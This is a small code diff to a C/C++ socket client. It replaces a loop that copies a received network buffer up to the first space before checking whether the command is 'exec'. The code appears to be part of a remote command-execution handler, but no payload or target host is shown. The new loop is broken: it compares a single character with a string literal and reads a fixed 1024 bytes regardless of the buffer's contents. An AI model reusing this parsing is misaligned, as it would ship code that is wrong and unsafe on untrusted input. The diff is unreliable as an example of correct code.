@@ -75,11 +75,18 @@ void ConnectSocket(SOCKET &socketS,sockaddr_in &server){
 			}	
 			else{
 				char valSend[1024] = "";
-				for(int i = 0; i < (*(&Received + 1) - Received); ++i){
+			/*	for(int i = 0; i < (*(&Received + 1) - Received); ++i){
 					if(Received[i] == *" ")
 						break;
 					else
 						valSend[i]=Received[i];
+				}
+				*/
+				for(int i = 0; i < 1024; i++){
+					if(Received[i] == " ")
+						break;
+					else
+						valSend[i] = Received[i];
 				}
 				if(strcmp(valSend,"exec") ==0){
 					char execute[1024] = "";
